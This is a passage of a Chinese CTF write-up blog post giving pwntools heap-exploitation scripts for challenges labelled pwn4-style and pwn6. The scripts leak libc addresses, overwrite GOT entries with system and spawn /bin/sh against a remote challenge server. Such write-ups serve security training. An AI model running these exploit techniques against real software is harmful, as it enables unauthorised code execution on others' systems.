class="number">0x30</span>) +p64(elf.got[<span class="string">&#x27;free&#x27;</span>])</span><br><span class="line">add(<span class="number">0x30</span>,payload)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Content: &quot;</span>)</span><br><span class="line">data = p.recvuntil(<span class="string">&quot;OK!&quot;</span>)</span><br><span class="line">free_addr = u64(data.split(<span class="string">b&quot;\n&quot;</span>)[<span class="number">0</span>].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">print(<span class="built_in">hex</span>(free_addr))</span><br><span class="line">base = free_addr - <span class="number">0x084540</span></span><br><span class="line"><span class="comment"># base = free_addr-libc.symbols[&quot;free&quot;]</span></span><br><span class="line"><span class="comment"># system = libc.symbols[&#x27;system&#x27;]+base</span></span><br><span class="line">system_addr = <span class="number">0x0453a0</span>+base</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = p64(system_addr)</span><br><span class="line">edit(<span class="number">1</span>,payload)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="pwn6"><a href="#pwn6" class="headerlink" title="pwn6"></a>pwn6</h3><p>和pwn4一样，区别在于没有给libc，需要先确定libc。本来是用LibcSearcher，发现效果不好。就根据泄露地址后三位，在libc database search中查询得到偏移。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = process(<span class="string">&quot;./pwn6&quot;</span>)</span><br><span class="line">p = remote(<span class="string">&quot;219.219.61.234&quot;</span>,<span class="number">10005</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn6&#x27;</span>)</span><br><span class="line"><span class="comment"># libc = ELF(&#x27;./libc-2.23.so&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">index,size,content</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;Your Choice&gt;&gt; &quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;index&gt;&gt; &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;size&gt;&gt; &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;name&gt;&gt; &quot;</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;Your Choice&gt;&gt; &quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;index&gt;&gt; &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,content</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;Your Choice&gt;&gt; &quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;index&gt;&gt; &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;name&gt;&gt; &quot;</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;Your Choice&gt;&gt; &quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;index&gt;&gt; &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;important secret\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">atol = elf.got[<span class="string">&quot;atol&quot;</span>]</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x200</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x200</span>,<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x90</span>,<span class="string">&#x27;c&#x27;</span>)</span><br><span class="line"><span class="comment">#这里先是修改index0的size大小，因此注意别改的太小。</span></span><br><span class="line">payload = p64(<span class="number">200</span>) + p64(atol)</span><br><span class="line">edit(<span class="number">2</span>,payload)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">atol_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">print(<span class="built_in">hex</span>(atol_addr))</span><br><span class="line"><span class="comment"># libc = LibcSearcher(&#x27;atol&#x27;,atol_addr)</span></span><br><span class="line"><span class="comment"># base = atol_addr - libc.dump(&#x27;atol&#x27;)</span></span><br><span class="line">base = atol_addr - <span class="number">0x036eb0</span></span><br><span class="line"><span class="comment"># system = libc.dump(&#x27;system&#x27;)+base</span></span><br><span class="line">system = <span class="number">0x0453a0</span>+base</span><br><span class="line"></span><br><span class="line"><span class="comment"># system = libc.symbols[&#x27;system&#x27;]+libcbase</span></span><br><span class="line"></span><br><span class="line">print(<span class="built_in">hex</span>(system))</span><br><span class="line">payload = p64(system)</span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line">p.sendline(<span class="string">&quot;/bin/sh&quot;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>








    </div>

    
    
    

    <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/" rel="tag"># 攻防世界</a>
          </div>

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/posts/6cd531ad/" rel="prev" title="unlink练习">
                  <i class="fa fa-chevron-left"></i> unlink练习
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/posts/e492a0d/" rel="next" title="网络安全课程作业">
                  网络安全课程作业 <i class="fa fa-chevron-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






      

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      const activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      const commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

    </div>
  </main>

  <footer class="footer">
    <div class="footer-inner">
      

      

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2021</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">ykx</span>
</div>
<!--
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
  </div>
-->

    </div>
  </footer>

  
  <script src="//cdn.jsdelivr.net/npm/animejs@3.2.0/lib/anime.min.js"></script>
<script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>

  




  <script src="/js/local-search.js"></script>















  








  

  

<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true}});</script></body>
</html>
